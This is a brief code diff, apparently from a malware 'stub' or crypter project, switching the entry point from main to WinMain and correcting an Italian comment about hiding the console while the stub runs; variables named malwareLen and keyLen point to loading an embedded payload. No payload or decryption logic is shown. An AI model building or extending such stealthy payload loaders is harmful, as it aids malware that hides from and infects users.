@@ -69,8 +69,8 @@ unsigned char *GetResource(int resourceId, char* resourceString, unsigned long* 
   DWORD  dwThreadId;
 } PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;*/
 
-int main(){
-    //FreeConsole(); //questo per nascondere la console mentre lo stub viene eseguitp
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    //FreeConsole(); //questo per nascondere la console mentre lo stub viene eseguito
     unsigned long malwareLen;
     unsigned long keyLen;
 
